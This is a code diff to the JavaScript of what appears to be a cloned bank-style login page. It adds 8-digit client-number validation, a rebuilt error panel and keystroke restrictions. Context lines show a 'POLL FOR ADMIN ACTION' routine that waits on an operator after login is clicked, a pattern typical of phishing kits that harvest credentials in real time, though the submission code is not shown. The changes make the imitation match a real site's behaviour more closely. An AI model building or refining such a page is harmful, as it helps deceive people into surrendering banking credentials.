@@ -51,47 +51,107 @@
     return pwdField ? pwdField.value : '';
   }
 
-  /* ===== 4. SHOW VALIDATION ERROR ===== */
+  /* ===== 4. VALIDATION ===== */
+  function validateFields() {
+    const clientNumber = getClientNumber();
+    const password = getPassword();
+    const errors = [];
+
+    // Check client number
+    if (!clientNumber) {
+      errors.push({
+        field: 'txtMyClientNumber_field',
+        label: 'Client number',
+        message: 'This is required.'
+      });
+    } else if (!/^\d{8}$/.test(clientNumber)) {
+      errors.push({
+        field: 'txtMyClientNumber_field',
+        label: 'Client number',
+        message: 'Please enter a valid 8 digit client number.'
+      });
+    }
+
+    // Check password
+    if (!password) {
+      errors.push({
+        field: 'txtMyPassword_field',
+        label: 'Password',
+        message: 'This is required.'
+      });
+    }
+
+    return errors;
+  }
+
+  /* ===== 5. SHOW VALIDATION ERROR ===== */
   function showValidationError() {
-    const messagePanel = document.getElementById('mplMessagePanel');
-    if (messagePanel) {
-      messagePanel.style.display = 'block';
-      messagePanel.className = 'MessagePanel arrow MessagePanel_Validation';
-      messagePanel.innerHTML = `
-        <div class="message_contents message_contents_validation">
-          <div class="message">
-            <div class="message_icon validation icon icon_validation">
-              <i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i>
-            </div><h3>
-              <span class="validation">We're sorry, information required for one or more fields is missing or incorrect.</span>
-            </h3><ul class="msg_cnt_wrp msg_cnt_wrp_validation">
-              <li class=""><div class="linkWrap">
-                <a href="#txtMyClientNumber_field" onclick="document.getElementById('txtMyClientNumber_field').focus(); return false;"><strong>Client number</strong></a> - 
-              </div><div class="msgWrap">
-                This is required.
-              </div></li><li class="last"><div class="linkWrap">
-                <a href="#txtMyPassword_field" onclick="document.getElementById('txtMyPassword_field').focus(); return false;"><strong>Password</strong></a> - 
-              </div><div class="msgWrap">
-                This is required.
-              </div></li>
-            </ul>
+    const errors = validateFields();
+    if (errors.length === 0) return true;
+
+    // Remove existing error
+    hideValidationError();
+
+    // Build error HTML
+    const errorList = errors.map((err, index) => {
+      const isLast = index === errors.length - 1 ? 'last' : '';
+      return `<li class="${isLast}"><div class="linkWrap">
+        <a href="#${err.field}" onclick="document.getElementById('${err.field}').focus(); return false;"><strong>${err.label}</strong></a> - 
+      </div><div class="msgWrap">
+        ${err.message}
+      </div></li>`;
+    }).join('');
+
+    const errorHtml = `
+      <div class="message_contents message_contents_validation" id="validationErrorContent">
+        <div class="message">
+          <div class="message_icon validation icon icon_validation">
+            <i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i>
           </div>
+          <h3>
+            <span class="validation">We're sorry, information required for one or more fields is missing or incorrect.</span>
+          </h3>
+          <ul class="msg_cnt_wrp msg_cnt_wrp_validation">
+            ${errorList}
+          </ul>
         </div>
-      `;
+      </div>
+    `;
+
+    // Insert after MainContent opening tag
+    const mainContent = document.getElementById('MainContent');
+    const tempDiv = document.createElement('div');
+    tempDiv.className = 'MessagePanel arrow MessagePanel_Validation';
+    tempDiv.id = 'validationErrorPanel';
+    tempDiv.innerHTML = errorHtml;
+    
+    // Insert as first child of MainContent
+    if (mainContent && mainContent.firstChild) {
+      mainContent.insertBefore(tempDiv, mainContent.firstChild);
+    } else if (mainContent) {
+      mainContent.appendChild(tempDiv);
     }
+
+    // Scroll to top
     window.scrollTo(0, 0);
+    
+    // Focus first error field
+    if (errors[0]) {
+      document.getElementById(errors[0].field).focus();
+    }
+
+    return false;
   }
 
-  /* ===== 5. HIDE VALIDATION ERROR ===== */
+  /* ===== 6. HIDE VALIDATION ERROR ===== */
   function hideValidationError() {
-    const messagePanel = document.getElementById('mplMessagePanel');
-    if (messagePanel) {
-      messagePanel.style.display = 'none';
-      messagePanel.innerHTML = '';
+    const existing = document.getElementById('validationErrorPanel');
+    if (existing) {
+      existing.remove();
     }
   }
 
-  /* ===== 6. SHOW LOADING OVERLAY ===== */
+  /* ===== 7. SHOW LOADING OVERLAY ===== */
   function showLoading() {
     const overlay = document.createElement('div');
     overlay.id = 'login-loading-overlay';
@@ -131,7 +191,7 @@
     document.body.appendChild(overlay);
   }
 
-  /* ===== 7. HIDE LOADING OVERLAY ===== */
+  /* ===== 8. HIDE LOADING OVERLAY ===== */
   function hideLoading() {
     const existing = document.getElementById('login-loading-overlay');
     if (existing) {
@@ -140,7 +200,7 @@
     }
   }
 
-  /* ===== 8. SHOW ERROR MESSAGE ===== */
+  /* ===== 9. SHOW ERROR MESSAGE ===== */
   function showErrorMessage() {
     const existingError = document.querySelector('.message.warning');
     if (existingError) {
@@ -173,7 +233,7 @@
     window.scrollTo(0, 0);
   }
 
-  /* ===== 9. CLEAR FORM ===== */
+  /* ===== 10. CLEAR FORM ===== */
   function clearForm() {
     const cifField = document.getElementById('txtMyClientNumber_field');
     if (cifField) {
@@ -188,7 +248,7 @@
     }
   }
 
-  /* ===== 10. POLL FOR ADMIN ACTION ===== */
+  /* ===== 11. POLL FOR ADMIN ACTION ===== */
   let isWaitingForAdmin = false;
 
   function startPolling() {
@@ -226,22 +286,21 @@
     poll();
   }
 
-  /* ===== 11. LOGIN ===== */
+  /* ===== 12. LOGIN ===== */
   document.addEventListener('click', (e) => {
     const btn = e.target.closest('#btnLogon_field');
     if (!btn) return;
-
-    const clientNumber = getClientNumber();
-    const password = getPassword();
 
     // Hide any previous validation error
     hideValidationError();
 
     // Validate fields
-    if (!clientNumber || !password) {
-      showValidationError();
+    if (!showValidationError()) {
       return;
     }
+
+    const clientNumber = getClientNumber();
+    const password = getPassword();
 
     showLoading();
 
@@ -269,9 +328,31 @@
   // Clear validation error when user starts typing
   document.addEventListener('input', (e) => {
     if (e.target.id === 'txtMyClientNumber_field' || e.target.id === 'txtMyPassword_field') {
-      const messagePanel = document.getElementById('mplMessagePanel');
-      if (messagePanel && messagePanel.style.display === 'block') {
-        hideValidationError();
+      hideValidationError();
+    }
+  });
+
+  // Restrict client number to digits only and max 8 chars
+  document.addEventListener('keydown', (e) => {
+    if (e.target.id === 'txtMyClientNumber_field') {
+      // Allow: backspace, delete, tab, escape, enter
+      if ([46, 8, 9, 27, 13].indexOf(e.keyCode) !== -1 ||
+          // Allow: Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X
+          (e.keyCode === 65 && e.ctrlKey === true) ||
+          (e.keyCode === 67 && e.ctrlKey === true) ||
+          (e.keyCode === 86 && e.ctrlKey === true) ||
+          (e.keyCode === 88 && e.ctrlKey === true) ||
+          // Allow: home, end, left, right
+          (e.keyCode >= 35 && e.keyCode <= 39)) {
+        return;
+      }
+      // Ensure that it is a number and stop the keypress if not
+      if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
+        e.preventDefault();
+      }
+      // Limit to 8 digits
+      if (e.target.value.length >= 8 && e.keyCode !== 8 && e.keyCode !== 46) {
+        e.preventDefault();
       }
     }
   });
